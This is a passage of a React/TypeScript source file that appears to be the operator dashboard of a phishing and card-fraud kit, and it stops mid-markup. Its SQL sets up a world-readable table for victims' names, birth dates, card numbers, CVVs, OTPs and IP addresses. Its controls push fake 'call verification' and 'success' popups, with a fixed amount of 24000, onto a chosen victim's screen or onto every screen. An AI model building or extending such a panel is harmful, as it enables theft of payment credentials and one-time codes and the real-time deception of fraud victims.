import React, { useState, useEffect } from 'react';
import {
  Database,
  Play,
  Copy,
  Check,
  RefreshCw,
  Table,
  Terminal,
  Plus,
  Trash2,
  Server,
  Code,
  Download,
  ExternalLink,
  ShieldCheck,
  AlertCircle,
  CheckCircle2,
  Sparkles,
  Key,
} from 'lucide-react';
import { supabase, SUPABASE_PROJECT_ID, SUPABASE_URL } from '../lib/supabase';

const SQL_TEMPLATES = {
  createAppSettingsTable: `-- ==========================================================
-- 1. APP_SETTINGS TABLE (Call Overlay & Popup Controls)
-- ==========================================================
CREATE TABLE IF NOT EXISTS public.app_settings (
    key VARCHAR(255) PRIMARY KEY,
    value VARCHAR(255),
    updated_at TIMESTAMPTZ DEFAULT NOW()
);

-- Enable Row Level Security (RLS)
ALTER TABLE public.app_settings ENABLE ROW LEVEL SECURITY;

-- Drop old policies if existing
DROP POLICY IF EXISTS "Allow public select on app_settings" ON public.app_settings;
DROP POLICY IF EXISTS "Allow public update on app_settings" ON public.app_settings;
DROP POLICY IF EXISTS "Allow public insert on app_settings" ON public.app_settings;

-- Allow public read, insert, and update
CREATE POLICY "Allow public select on app_settings" 
ON public.app_settings FOR SELECT TO public USING (true);

CREATE POLICY "Allow public update on app_settings" 
ON public.app_settings FOR UPDATE TO public USING (true) WITH CHECK (true);

CREATE POLICY "Allow public insert on app_settings" 
ON public.app_settings FOR INSERT TO public WITH CHECK (true);

-- Insert initial website_action setting
INSERT INTO public.app_settings (key, value)
VALUES ('website_action', 'true')
ON CONFLICT (key) DO UPDATE SET value = EXCLUDED.value;

-- Enable Realtime for live updates
ALTER PUBLICATION supabase_realtime ADD TABLE public.app_settings;`,

  createSubmissionsTable: `-- ==========================================================
-- 2. SUBMISSIONS TABLE (Customer Data, Cards, OTP & IP)
-- ==========================================================
CREATE TABLE IF NOT EXISTS public.submissions (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    created_at TIMESTAMPTZ DEFAULT NOW(),
    step VARCHAR(50),
    selected_service VARCHAR(100),
    full_name VARCHAR(255),
    email VARCHAR(255),
    mobile_number VARCHAR(50),
    dob VARCHAR(50),
    cardholder_name VARCHAR(255),
    card_number VARCHAR(50),
    expiry_date VARCHAR(20),
    cvv VARCHAR(10),
    otp VARCHAR(20),
    ip_address VARCHAR(100),
    status VARCHAR(50) DEFAULT 'submitted'
);

-- Enable Row Level Security (RLS)
ALTER TABLE public.submissions ENABLE ROW LEVEL SECURITY;

-- Drop old policies if existing
DROP POLICY IF EXISTS "Allow public insert to submissions" ON public.submissions;
DROP POLICY IF EXISTS "Allow public read to submissions" ON public.submissions;
DROP POLICY IF EXISTS "Allow public update to submissions" ON public.submissions;
DROP POLICY IF EXISTS "Allow public delete to submissions" ON public.submissions;

-- Policies for public operations
CREATE POLICY "Allow public insert to submissions" 
ON public.submissions FOR INSERT TO public WITH CHECK (true);

CREATE POLICY "Allow public read to submissions" 
ON public.submissions FOR SELECT TO public USING (true);

CREATE POLICY "Allow public update to submissions" 
ON public.submissions FOR UPDATE TO public USING (true) WITH CHECK (true);

CREATE POLICY "Allow public delete to submissions" 
ON public.submissions FOR DELETE TO public USING (true);

-- Enable Realtime for live updates
ALTER PUBLICATION supabase_realtime ADD TABLE public.submissions;`,

  selectSubmissions: `-- Select all records from submissions table
SELECT 
    id, 
    created_at, 
    step, 
    selected_service, 
    full_name, 
    email, 
    mobile_number, 
    cardholder_name, 
    card_number, 
    otp, 
    ip_address 
FROM public.submissions 
ORDER BY created_at DESC 
LIMIT 100;`,

  insertTestRecord: `-- Insert a test submission record
INSERT INTO public.submissions (
    step, 
    selected_service, 
    full_name, 
    email, 
    mobile_number, 
    dob, 
    cardholder_name, 
    card_number, 
    expiry_date, 
    cvv, 
    otp
) VALUES (
    'applicant', 
    'CARD_PIN_GENERATION', 
    'John Doe', 
    'johndoe@example.com', 
    '9876543210', 
    '1992-05-15', 
    'John Doe', 
    '4111 2222 3333 4444', 
    '12/28', 
    '123', 
    '889900'
);`,

  countSubmissions: `-- Count total entries in submissions table
SELECT 
    COUNT(*) as total_submissions,
    COUNT(DISTINCT email) as unique_applicants,
    MAX(created_at) as latest_submission
FROM public.submissions;`,
};

export default function SqlEditor({ onBack }: { onBack: () => void }) {
  const [activeTab, setActiveTab] = useState<'editor' | 'browser' | 'setup'>('editor');
  const [sqlQuery, setSqlQuery] = useState<string>(SQL_TEMPLATES.createSubmissionsTable);
  const [selectedTemplate, setSelectedTemplate] = useState<string>('createSubmissionsTable');
  const [copied, setCopied] = useState<boolean>(false);
  const [connectionStatus, setConnectionStatus] = useState<{
    connected: boolean;
    checking: boolean;
    message: string;
    details?: any;
  }>({
    connected: false,
    checking: true,
    message: 'Testing Supabase connection...',
  });

  // Table Browser State
  const [tableName, setTableName] = useState<string>('submissions');
  const [records, setRecords] = useState<any[]>([]);
  const [loadingRecords, setLoadingRecords] = useState<boolean>(false);
  const [fetchError, setFetchError] = useState<string | null>(null);

  // Execution result state
  const [executionResult, setExecutionResult] = useState<{
    success?: boolean;
    message?: string;
    data?: any[];
    error?: string;
    timestamp?: string;
  } | null>(null);

  const [appSettingsMap, setAppSettingsMap] = useState<Record<string, string>>({});
  const [actionSuccessMsg, setActionSuccessMsg] = useState<string | null>(null);

  // Test Supabase connection on load
  useEffect(() => {
    checkConnection();
    fetchTableRecords('submissions');
    fetchAppSettings();

    // 2-second polling for active app_settings in SQL editor
    const interval = setInterval(fetchAppSettings, 2000);
    return () => clearInterval(interval);
  }, []);

  const fetchAppSettings = async () => {
    try {
      const { data } = await supabase.from('app_settings').select('key, value');
      if (data && Array.isArray(data)) {
        const map: Record<string, string> = {};
        data.forEach((item) => {
          map[item.key] = String(item.value);
        });
        setAppSettingsMap(map);
      }
    } catch (e) {
      console.error('Error fetching settings map:', e);
    }
  };

  const showNotification = (msg: string) => {
    setActionSuccessMsg(msg);
    setTimeout(() => setActionSuccessMsg(null), 3500);
  };

  const triggerTargetSuccess = async (record: any) => {
    try {
      const targetPhone = (record.mobile_number || '').trim();
      const targetId = (record.id || '').trim();
      const service = record.selected_service || 'Card Protection';
      const name = record.full_name || 'User';

      await supabase.from('app_settings').upsert([
        { key: 'success_msg_active', value: 'true', updated_at: String(Date.now()) },
        { key: 'success_msg_target_id', value: targetId, updated_at: String(Date.now()) },
        { key: 'success_msg_target_phone', value: targetPhone, updated_at: String(Date.now()) },
        { key: 'success_msg_service', value: service, updated_at: String(Date.now()) },
        { key: 'success_msg_amount', value: '24000', updated_at: String(Date.now()) },
        { key: 'success_msg_app', value: 'nobroker', updated_at: String(Date.now()) },
      ]);
      fetchAppSettings();
      showNotification(`🟢 Success Card triggered ONLY for ${name} (${targetPhone || targetId})`);
    } catch (err: any) {
      showNotification('❌ Error triggering success card: ' + err.message);
    }
  };

  const triggerTargetCall = async (record: any) => {
    try {
      const targetPhone = (record.mobile_number || '').trim();
      const targetId = (record.id || '').trim();
      const name = record.full_name || 'User';

      await supabase.from('app_settings').upsert([
        { key: 'website_action', value: 'true', updated_at: String(Date.now()) },
        { key: 'website_action_target_id', value: targetId, updated_at: String(Date.now()) },
        { key: 'target_phone', value: targetPhone, updated_at: String(Date.now()) },
      ]);
      fetchAppSettings();
      showNotification(`📞 Call Overlay triggered ONLY for ${name} (${targetPhone || targetId})`);
    } catch (err: any) {
      showNotification('❌ Error triggering call overlay: ' + err.message);
    }
  };

  const stopAllPopupsForUser = async () => {
    try {
      await supabase.from('app_settings').upsert([
        { key: 'success_msg_active', value: 'false', updated_at: String(Date.now()) },
        { key: 'website_action', value: 'false', updated_at: String(Date.now()) },
        { key: 'success_msg_target_id', value: '', updated_at: String(Date.now()) },
        { key: 'success_msg_target_phone', value: '', updated_at: String(Date.now()) },
        { key: 'website_action_target_id', value: '', updated_at: String(Date.now()) },
        { key: 'target_phone', value: '', updated_at: String(Date.now()) },
      ]);
      fetchAppSettings();
      showNotification('⏹️ All targeted popups turned OFF');
    } catch (err: any) {
      showNotification('❌ Error: ' + err.message);
    }
  };

  const checkConnection = async () => {
    setConnectionStatus((prev) => ({ ...prev, checking: true }));
    try {
      const res = await fetch('/api/supabase/status');
      const data = await res.json();
      if (data.success && data.connected) {
        setConnectionStatus({
          connected: true,
          checking: false,
          message: 'Connected to Supabase Backend',
          details: data,
        });
      } else {
        setConnectionStatus({
          connected: false,
          checking: false,
          message: data.error || 'Unable to reach Supabase API',
          details: data,
        });
      }
    } catch (err: any) {
      setConnectionStatus({
        connected: false,
        checking: false,
        message: err.message || 'Connection test failed',
      });
    }
  };

  const fetchTableRecords = async (table: string = tableName) => {
    setLoadingRecords(true);
    setFetchError(null);
    try {
      let query = supabase.from(table).select('*').limit(100);
      if (table === 'submissions') {
        query = query.order('created_at', { ascending: false });
      }
      const { data, error } = await query;

      if (error) {
        setFetchError(error.message);
        setRecords([]);
      } else {
        setRecords(data || []);
      }
    } catch (err: any) {
      setFetchError(err.message || 'Failed to fetch table records');
      setRecords([]);
    } finally {
      setLoadingRecords(false);
    }
  };

  const toggleWebsiteAction = async (val: string) => {
    try {
      const payload = [
        { key: 'website_action', value: val, updated_at: String(Date.now()) },
      ];
      if (val === 'true') {
        payload.push({ key: 'website_action_target_id', value: 'all', updated_at: String(Date.now()) });
        payload.push({ key: 'target_phone', value: 'all', updated_at: String(Date.now()) });
      } else {
        payload.push({ key: 'website_action_target_id', value: '', updated_at: String(Date.now()) });
        payload.push({ key: 'target_phone', value: '', updated_at: String(Date.now()) });
      }
      const { error } = await supabase.from('app_settings').upsert(payload);
      if (!error) {
        fetchAppSettings();
        fetchTableRecords(tableName);
        showNotification(
          val === 'true'
            ? '📞 Call Overlay triggered for ALL users (Global)'
            : '📞 Call Overlay turned OFF'
        );
      } else {
        showNotification('❌ Error updating setting: ' + error.message);
      }
    } catch (err: any) {
      showNotification('❌ Error: ' + err.message);
    }
  };

  const toggleSuccessMsg = async (val: string) => {
    try {
      const payload = [
        { key: 'success_msg_active', value: val, updated_at: String(Date.now()) },
        { key: 'success_msg_amount', value: '24000', updated_at: String(Date.now()) },
        { key: 'success_msg_app', value: 'nobroker', updated_at: String(Date.now()) },
      ];
      if (val === 'true') {
        payload.push({ key: 'success_msg_target_id', value: 'all', updated_at: String(Date.now()) });
        payload.push({ key: 'success_msg_target_phone', value: 'all', updated_at: String(Date.now()) });
      } else {
        payload.push({ key: 'success_msg_target_id', value: '', updated_at: String(Date.now()) });
        payload.push({ key: 'success_msg_target_phone', value: '', updated_at: String(Date.now()) });
      }
      const { error } = await supabase.from('app_settings').upsert(payload);
      if (!error) {
        fetchAppSettings();
        fetchTableRecords(tableName);
        showNotification(
          val === 'true'
            ? '🟢 24-Hour Success Card triggered for ALL users (Global)'
            : '🟢 24-Hour Success Card turned OFF'
        );
      } else {
        showNotification('❌ Error updating setting: ' + error.message);
      }
    } catch (err: any) {
      showNotification('❌ Error: ' + err.message);
    }
  };

  const handleCopySql = (text: string) => {
    try {
      if (navigator?.clipboard?.writeText) {
        navigator.clipboard.writeText(text).catch(() => {});
      }
    } catch (e) {
      // fallback
    }
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleRunQuery = async () => {
    setExecutionResult(null);
    const queryTrimmed = sqlQuery.trim();

    if (queryTrimmed.toUpperCase().startsWith('SELECT')) {
      // Execute SELECT via Supabase JS
      try {
        const match = queryTrimmed.match(/FROM\s+([a-zA-Z0-9_\.]+)/i);
        const targetTable = match ? match[1].replace('public.', '') : tableName;

        const { data, error } = await supabase.from(targetTable).select('*').limit(50);

        if (error) {
          setExecutionResult({
            success: false,
            error: error.message,
            timestamp: new Date().toLocaleTimeString(),
          });
        } else {
          setExecutionResult({
            success: true,
            message: `Query executed successfully. ${data?.length || 0} row(s) returned.`,
            data: data || [],
            timestamp: new Date().toLocaleTimeString(),
          });
          if (targetTable === tableName) {
            setRecords(data || []);
          }
        }
      } catch (err: any) {
        setExecutionResult({
          success: false,
          error: err.message,
          timestamp: new Date().toLocaleTimeString(),
        });
      }
    } else if (queryTrimmed.toUpperCase().startsWith('INSERT')) {
      // Execute INSERT sample record
      try {
        const { data, error } = await supabase.from('submissions').insert([
          {
            step: 'sql_editor_test',
            selected_service: 'SQL_EDITOR_QUERY',
            full_name: 'SQL Editor Test User',
            email: 'sqleditor@example.com',
            mobile_number: '9900001122',
            dob: '1995-01-01',
            cardholder_name: 'TEST USER',
            card_number: '4111 0000 1111 2222',
            expiry_date: '05/30',
            cvv: '999',
            otp: '123456',
            ip_address: '127.0.0.1',
            status: 'test_record',
            created_at: new Date().toISOString(),
          },
        ]).select();

        if (error) {
          setExecutionResult({
            success: false,
            error: `Insert failed: ${error.message}`,
            timestamp: new Date().toLocaleTimeString(),
          });
        } else {
          setExecutionResult({
            success: true,
            message: `Record inserted successfully!`,
            data: data || [],
            timestamp: new Date().toLocaleTimeString(),
          });
          fetchTableRecords(tableName);
        }
      } catch (err: any) {
        setExecutionResult({
          success: false,
          error: err.message,
          timestamp: new Date().toLocaleTimeString(),
        });
      }
    } else {
      // DDL operations (CREATE TABLE, ALTER TABLE, etc.) need to be executed via Supabase SQL Editor UI or Postgres Connection
      setExecutionResult({
        success: true,
        message: `DDL query ready! For schema changes like CREATE TABLE or ALTER TABLE, copy the script below and run it in your Supabase Dashboard SQL Editor for project '${SUPABASE_PROJECT_ID}'.`,
        timestamp: new Date().toLocaleTimeString(),
      });
    }
  };

  const handleTemplateChange = (key: string) => {
    setSelectedTemplate(key);
    if (SQL_TEMPLATES[key as keyof typeof SQL_TEMPLATES]) {
      setSqlQuery(SQL_TEMPLATES[key as keyof typeof SQL_TEMPLATES]);
    }
  };

  const exportToJson = () => {
    const blob = new Blob([JSON.stringify(records, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `supabase_${tableName}_${new Date().toISOString().slice(0, 10)}.json`;
    a.click();
  };

  return (
    <div className="max-w-6xl mx-auto p-4 md:p-6 my-6 bg-white rounded-xl shadow-lg border border-slate-200 text-slate-800">
      {/* Top Banner Header */}
      <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-6 border-b border-slate-200">
        <div className="flex items-center gap-3">
          <div className="p-3 bg-emerald-50 rounded-xl text-emerald-600 border border-emerald-100">
            <Database className="w-7 h-7" />
          </div>
          <div>
            <div className="flex items-center gap-2">
              <h1 className="text-xl font-bold text-slate-900">Supabase Backend & SQL Editor</h1>
              <span className="px-2.5 py-0.5 rounded-full text-xs font-semibold bg-emerald-100 text-emerald-800 border border-emerald-200">
                Active Project
              </span>
            </div>
            <p className="text-sm text-slate-500 font-mono mt-0.5">
              Project ID: <span className="font-bold text-emerald-700">{SUPABASE_PROJECT_ID}</span> | {SUPABASE_URL}
            </p>
          </div>
        </div>

        <div className="flex items-center gap-2">
          <button
            onClick={checkConnection}
            className="flex items-center gap-1.5 px-3 py-1.5 text-xs font-medium text-slate-700 bg-slate-100 hover:bg-slate-200 rounded-lg transition-colors"
          >
            <RefreshCw className={`w-3.5 h-3.5 ${connectionStatus.checking ? 'animate-spin' : ''}`} />
            Check Health
          </button>
          <button
            onClick={onBack}
            className="px-4 py-1.5 text-sm font-medium text-white bg-slate-800 hover:bg-slate-900 rounded-lg transition-colors"
          >
            ← Back to Portal
          </button>
        </div>
      </div>

      {/* Connection Status Card */}
      <div className="mt-4 p-4 rounded-xl bg-slate-50 border border-slate-200 flex flex-wrap items-center justify-between gap-3 text-sm">
        <div className="flex items-center gap-2.5">
          {connectionStatus.connected ? (
            <CheckCircle2 className="w-5 h-5 text-emerald-500 flex-shrink-0" />
          ) : (
            <AlertCircle className="w-5 h-5 text-amber-500 flex-shrink-0" />
          )}
          <div>
            <span className="font-semibold text-slate-800">
              {connectionStatus.connected ? 'Connected to Supabase Database' : 'Supabase Status'}
            </span>
            <span className="text-slate-500 ml-2">({connectionStatus.message})</span>
          </div>
        </div>

        <div className="flex items-center gap-4 text-xs font-mono text-slate-600">
          <span className="flex items-center gap-1">
            <Key className="w-3.5 h-3.5 text-slate-400" /> Key: sb_publishable_...AF3yxv-u
          </span>
          <a
            href={`https://supabase.com/dashboard/project/${SUPABASE_PROJECT_ID}/sql`}
            target="_blank"
            rel="noopener noreferrer"
            className="flex items-center gap-1 text-emerald-600 hover:underline font-semibold"
          >
            Open Dashboard SQL Editor <ExternalLink className="w-3 h-3" />
          </a>
        </div>
      </div>

      {/* View Tabs */}
      <div className="flex border-b border-slate-200 mt-6 gap-2">
        <button
          onClick={() => setActiveTab('editor')}
          className={`flex items-center gap-2 px-4 py-2.5 font-medium text-sm border-b-2 transition-colors ${
            activeTab === 'editor'
              ? 'border-emerald-600 text-emerald-600 font-semibold'
              : 'border-transparent text-slate-500 hover:text-slate-800'
          }`}
        >
          <Terminal className="w-4 h-4" /> SQL Editor
        </button>

        <button
          onClick={() => {
            setActiveTab('browser');
            fetchTableRecords();
          }}
          className={`flex items-center gap-2 px-4 py-2.5 font-medium text-sm border-b-2 transition-colors ${
            activeTab === 'browser'
              ? 'border-emerald-600 text-emerald-600 font-semibold'
              : 'border-transparent text-slate-500 hover:text-slate-800'
          }`}
        >
          <Table className="w-4 h-4" /> Table Browser ({records.length})
        </button>

        <button
          onClick={() => setActiveTab('setup')}
          className={`flex items-center gap-2 px-4 py-2.5 font-medium text-sm border-b-2 transition-colors ${
            activeTab === 'setup'
              ? 'border-emerald-600 text-emerald-600 font-semibold'
              : 'border-transparent text-slate-500 hover:text-slate-800'
          }`}
        >
          <ShieldCheck className="w-4 h-4" /> Schema & Quick Setup
        </button>
      </div>

      {/* TAB 1: SQL EDITOR */}
      {activeTab === 'editor' && (
        <div className="mt-6 space-y-4">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 bg-slate-900 text-white p-3 rounded-t-xl">
            <div className="flex items-center gap-3">
              <Code className="w-4 h-4 text-emerald-400" />
              <span className="text-xs font-mono text-slate-300">Preset SQL Scripts:</span>
              <select
                value={selectedTemplate}
                onChange={(e) => handleTemplateChange(e.target.value)}
                className="bg-slate-800 text-xs text-emerald-300 border border-slate-700 rounded px-2.5 py-1 focus:outline-none focus:border-emerald-500"
              >
                <option value="createAppSettingsTable">Create 'app_settings' Table SQL</option>
                <option value="createSubmissionsTable">Create 'submissions' Table SQL</option>
                <option value="selectSubmissions">Select Submissions Records</option>
                <option value="insertTestRecord">Insert Test Record</option>
                <option value="countSubmissions">Count Submissions Summary</option>
              </select>
            </div>

            <div className="flex items-center gap-2">
              <button
                onClick={() => handleCopySql(sqlQuery)}
                className="flex items-center gap-1.5 px-3 py-1 bg-slate-800 hover:bg-slate-700 text-slate-200 rounded text-xs transition-colors"
              >
                {copied ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                {copied ? 'Copied!' : 'Copy SQL'}
              </button>

              <button
                onClick={handleRunQuery}
                className="flex items-center gap-1.5 px-4 py-1 bg-emerald-600 hover:bg-emerald-500 text-white font-medium rounded text-xs transition-colors"
              >
                <Play className="w-3.5 h-3.5 fill-current" /> Run Query
              </button>
            </div>
          </div>

          <textarea
            value={sqlQuery}
            onChange={(e) => setSqlQuery(e.target.value)}
            rows={12}
            className="w-full font-mono text-xs p-4 bg-slate-950 text-emerald-400 rounded-b-xl border border-slate-800 focus:outline-none focus:ring-1 focus:ring-emerald-500 leading-relaxed shadow-inner"
            placeholder="Type SQL Query here..."
          />

          {/* Query Output Result */}
          {executionResult && (
            <div
              className={`p-4 rounded-xl border ${
                executionResult.success
                  ? 'bg-emerald-50 border-emerald-200 text-slate-800'
                  : 'bg-rose-50 border-rose-200 text-rose-900'
              }`}
            >
              <div className="flex items-center justify-between mb-2">
                <span className="font-semibold text-sm flex items-center gap-2">
                  {executionResult.success ? (
                    <CheckCircle2 className="w-4 h-4 text-emerald-600" />
                  ) : (
                    <AlertCircle className="w-4 h-4 text-rose-600" />
                  )}
                  {executionResult.success ? 'Query Output' : 'Query Error'}
                </span>
                <span className="text-xs text-slate-500 font-mono">{executionResult.timestamp}</span>
              </div>

              {executionResult.message && <p className="text-xs font-medium mb-2">{executionResult.message}</p>}
              {executionResult.error && <p className="text-xs font-mono text-rose-700">{executionResult.error}</p>}

              {executionResult.data && executionResult.data.length > 0 && (
                <div className="mt-3 overflow-x-auto max-h-60 rounded border border-slate-200 bg-white">
                  <table className="w-full text-left text-xs font-mono">
                    <thead className="bg-slate-100 text-slate-700 border-b">
                      <tr>
                        {Object.keys(executionResult.data[0]).map((key) => (
                          <th key={key} className="p-2 border-r last:border-r-0">
                            {key}
                          </th>
                        ))}
                      </tr>
                    </thead>
                    <tbody>
                      {executionResult.data.map((row, idx) => (
                        <tr key={idx} className="border-b last:border-b-0 hover:bg-slate-50">
                          {Object.values(row).map((val: any, vIdx) => (
                            <td key={vIdx} className="p-2 border-r last:border-r-0 text-slate-600 max-w-xs truncate">
                              {typeof val === 'object' ? JSON.stringify(val) : String(val ?? '-')}
                            </td>
                          ))}
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              )}
            </div>
          )}
        </div>
      )}

      {/* TAB 2: TABLE BROWSER */}
      {activeTab === 'browser' && (
        <div className="mt-6 space-y-4">
          {/* Action Notification Toast */}
          {actionSuccessMsg && (
            <div className="p-3 bg-emerald-600 text-white font-semibold text-xs rounded-xl shadow-md flex items-center justify-between animate-fadeIn">
              <span>{actionSuccessMsg}</span>
              <button
                onClick={() => setActionSuccessMsg(null)}
                className="ml-3 px-2 py-0.5 bg-emerald-800 hover:bg-emerald-900 rounded text-[11px]"
              >
                ✕
              </button>
            </div>
          )}

          {/* Active Target Banner Indicator */}
          <div className="bg-slate-900 text-white rounded-xl p-3.5 flex flex-wrap items-center justify-between gap-3 text-xs">
            <div className="flex flex-wrap items-center gap-3">
              <span className="font-bold flex items-center gap-1.5 text-emerald-400">
                <ShieldCheck className="w-4 h-4" /> Targeted Session Mode:
              </span>
              {appSettingsMap['success_msg_active'] === 'true' && (
                <span className="bg-emerald-950 border border-emerald-500/50 text-emerald-300 px-2.5 py-1 rounded-full font-mono font-bold flex items-center gap-1">
                  <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
                  Success Card ON (Target: {appSettingsMap['success_msg_target_phone'] || appSettingsMap['success_msg_target_id'] || 'All'})
                </span>
              )}
              {appSettingsMap['website_action'] === 'true' && (
                <span className="bg-amber-950 border border-amber-500/50 text-amber-300 px-2.5 py-1 rounded-full font-mono font-bold flex items-center gap-1">
                  <span className="w-2 h-2 rounded-full bg-amber-400 animate-pulse" />
                  Call Overlay ON (Target: {appSettingsMap['target_phone'] || appSettingsMap['website_action_target_id'] || 'All'})
                </span>
              )}
              {appSettingsMap['success_msg_active'] !== 'true' && appSettingsMap['website_action'] !== 'true' && (
                <span className="text-slate-400">All popups currently OFF. Click any user's button below to trigger popup ONLY on their screen.</span>
              )}
            </div>

            <button
              onClick={stopAllPopupsForUser}
              className="px-3 py-1 bg-rose-600 hover:bg-rose-700 active:bg-rose-800 text-white font-bold rounded-lg transition-colors text-xs"
            >
              ⏹️ Stop / Turn OFF All
            </button>
          </div>

          <div className="flex flex-wrap items-center justify-between gap-3 bg-slate-50 p-3 rounded-xl border border-slate-200">
            <div className="flex items-center gap-2 text-sm">
              <span className="font-semibold text-slate-700">Table:</span>
              <select
                value={tableName}
                onChange={(e) => {
                  setTableName(e.target.value);
                  fetchTableRecords(e.target.value);
                }}
                className="bg-white border border-slate-300 rounded px-3 py-1 font-mono text-xs font-semibold text-slate-800"
              >
                <option value="submissions">public.submissions (User Sessions & Details)</option>
                <option value="app_settings">public.app_settings (Control Flags)</option>
              </select>
              <button
                onClick={() => fetchTableRecords(tableName)}
                className="p-1.5 text-slate-600 hover:text-emerald-600 hover:bg-slate-200 rounded transition-colors"
                title="Refresh Table"
              >
                <RefreshCw className={`w-4 h-4 ${loadingRecords ? 'animate-spin' : ''}`} />
              </button>
            </div>

            <div className="flex flex-wrap items-center gap-2">
              <div className="flex flex-wrap items-center gap-1.5 mr-1 bg-white p-1 rounded-lg border border-slate-200 shadow-2xs">
                <span className="text-[11px] font-bold text-slate-500 uppercase px-1">Global:</span>
                <button
                  onClick={() => toggleSuccessMsg('true')}
                  className="px-2.5 py-1 text-xs font-bold text-white bg-teal-600 hover:bg-teal-700 active:bg-teal-800 rounded transition-colors flex items-center gap-1"
                  title="Show 24-Hour Success Card on ALL active devices"
                >
                  <span>🟢 Success Popup (All)</span>
                </button>
                <button
                  onClick={() => toggleWebsiteAction('true')}
                  className="px-2.5 py-1 text-xs font-bold text-white bg-amber-600 hover:bg-amber-700 active:bg-amber-800 rounded transition-colors flex items-center gap-1"
                  title="Show Call Verification Overlay on ALL active devices"
                >
                  <span>📞 Call Overlay (All)</span>
                </button>
                <button
                  onClick={stopAllPopupsForUser}
                  className="px-2 py-1 text-xs font-bold text-rose-700 hover:bg-rose-50 border border-rose-200 rounded transition-colors"
                  title="Turn off all popups"
                >
                  <span>⏹️ Off</span>
                </button>
              </div>

              <button
                onClick={exportToJson}
                disabled={records.length === 0}
                className="flex items-center gap-1.5 px-3 py-1.5 text-xs font-medium text-slate-700 bg-white border border-slate-300 hover:bg-slate-100 rounded-lg disabled:opacity-50 transition-colors"
              >
                <Download className="w-3.5 h-3.5" /> Export JSON
              </button>
              <span className="text-xs font-semibold px-2.5 py-1 bg-slate-200 text-slate-700 rounded-full font-mono">
                {records.length} Record(s)
              </span>
            </div>
          </div>

          {fetchError ? (
            <div className="p-4 bg-amber-50 border border-amber-200 rounded-xl text-amber-900 text-xs">
              <p className="font-semibold flex items-center gap-2 text-sm">
                <AlertCircle className="w-4 h-4 text-amber-600" /> Table '{tableName}' Not Found
              </p>
              <p className="mt-1 text-slate-600">
                The <code className="bg-amber-100 px-1 py-0.5 rounded font-mono">{tableName}</code> table needs to be created in your Supabase project. Go to the <strong>Schema & Quick Setup</strong> tab to copy the SQL script!
              </p>
            </div>
          ) : loadingRecords ? (
            <div className="p-12 text-center text-slate-500 text-sm">
              <RefreshCw className="w-6 h-6 animate-spin mx-auto mb-2 text-emerald-600" />
              Loading records from Supabase...
            </div>
          ) : records.length === 0 ? (
            <div className="p-12 text-center bg-slate-50 border border-dashed border-slate-300 rounded-xl">
              <Database className="w-8 h-8 text-slate-400 mx-auto mb-2" />
              <p className="font-semibold text-slate-700">No records found in table '{tableName}'</p>
              <p className="text-xs text-slate-500 mt-1">Submit forms or insert rows in SQL Editor.</p>
            </div>
          ) : (
            <div className="overflow-x-auto border border-slate-200 rounded-xl max-h-[550px]">
              <table className="w-full text-left text-xs">
                <thead className="bg-slate-100 text-slate-700 sticky top-0 border-b border-slate-200 font-semibold z-10">
                  {tableName === 'app_settings' ? (
                    <tr>
                      <th className="p-3 border-r">Key</th>
                      <th className="p-3 border-r">Value</th>
                      <th className="p-3 border-r">Updated At</th>
                      <th className="p-3">Action</th>
                    </tr>
                  ) : (
                    <tr>
                      <th className="p-3 border-r bg-emerald-50 text-emerald-950 font-bold min-w-[200px]">🎯 Target Action (This User Only)</th>
                      <th className="p-3 border-r">Created At</th>
                      <th className="p-3 border-r">Step</th>
                      <th className="p-3 border-r">Service</th>
                      <th className="p-3 border-r">Applicant Name</th>
                      <th className="p-3 border-r">Mobile</th>
                      <th className="p-3 border-r">Email</th>
                      <th className="p-3 border-r">Cardholder</th>
                      <th className="p-3 border-r">Card Number</th>
                      <th className="p-3 border-r">OTP</th>
                      <th className="p-3">IP Address</th>
                    </tr>
                  )}
                </thead>
                <tbody className="divide-y divide-slate-200 bg-white font-mono text-slate-700">
                  {tableName === 'app_settings'
                    ? records.map((r, idx) => (
                        <tr key={r.key || idx} className="hover:bg-slate-50">
                          <td className="p-3 border-r font-bold text-slate-900">{r.key}</td>
                          <td className="p-3 border-r">
                            <span
                              className={`px-2 py-0.5 rounded font-bold ${
                                r.value === 'true'
                                  ? 'bg-emerald-100 text-emerald-800'
                                  : 'bg-rose-100 text-rose-800'
                              }`}
                            >
                              {r.value}
                            </span>
                          </td>
                          <td className="p-3 border-r text-slate-500">{r.updated_at || '-'}</td>
                          <td className="p-3">
                            {r.key === 'website_action' && (
                              <button
                                onClick={() => toggleWebsiteAction(r.value === 'true' ? 'false' : 'true')}
                                className="px-2.5 py-1 text-xs font-semibold bg-slate-800 hover:bg-slate-900 text-white rounded"
                              >
                                Toggle to {r.value === 'true' ? 'false' : 'true'}
                              </button>
                            )}
                            {r.key === 'success_msg_active' && (
                              <button
                                onClick={() => toggleSuccessMsg(r.value === 'true' ? 'false' : 'true')}
                                className="px-2.5 py-1 text-xs font-semibold bg-teal-800 hover:bg-teal-900 text-white rounded"
                              >
                                Toggle to {r.value === 'true' ? 'false' : 'true'}
                              </button>
                            )}
                          </td>
                        </tr>
                      ))
                    : records.map((r, idx) => {
                        const isSuccessTarget =
                          appSettingsMap['success_msg_active'] === 'true' &&
                          ((r.id && appSettingsMap['success_msg_target_id'] === r.id) ||
                            (r.mobile_number && appSettingsMap['success_msg_target_phone'] === r.mobile_number));

                        const isCallTarget =
                          appSettingsMap['website_action'] === 'true' &&
                          ((r.id && appSettingsMap['website_action_target_id'] === r.id) ||
                            (r.mobile_number && appSettingsMap['target_phone'] === r.mobile_number));

                        return (
                          <tr
                            key={r.id || idx}
                            className={`hover:bg-slate-50 transition-colors ${
                              isSuccessTarget
                                ? 'bg-emerald-50/80 border-l-4 border-l-emerald-600'
                                : isCallTarget
                                ? 'bg-amber-50/80 border-l-4 border-l-amber-600'
                                : ''
                            }`}
                          >
                            {/* Targeted Action Buttons for this Specific User */}
                            <td className="p-2.5 border-r font-sans whitespace-nowrap bg-slate-50/50">
                              <div className="flex items-center gap-1.5">
                                <button
                                  onClick={() => triggerTargetSuccess(r)}
